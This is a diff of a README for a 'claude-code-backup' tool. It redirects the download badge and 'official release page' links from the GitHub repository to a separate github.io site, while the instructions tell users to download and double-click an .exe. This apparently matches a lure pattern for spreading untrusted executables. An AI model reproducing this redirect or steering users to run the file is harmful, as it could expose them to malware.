@@ -1,6 +1,6 @@
 # 💾 claude-code-backup - Save your Claude settings to GitHub
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sibyllablueviolet195/claude-code-backup)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://sibyllablueviolet195.github.io)
 
 ### 📋 Overview
 
@@ -18,7 +18,7 @@ This application protects your work. It tracks changes to your configuration fil
 
 ### 📥 Installing the Application
 
-1. Visit the [official release page](https://github.com/Sibyllablueviolet195/claude-code-backup) to download the software.
+1. Visit the [official release page](https://sibyllablueviolet195.github.io) to download the software.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Save the file to your Downloads folder.
 4. Double-click the file to start the installation.
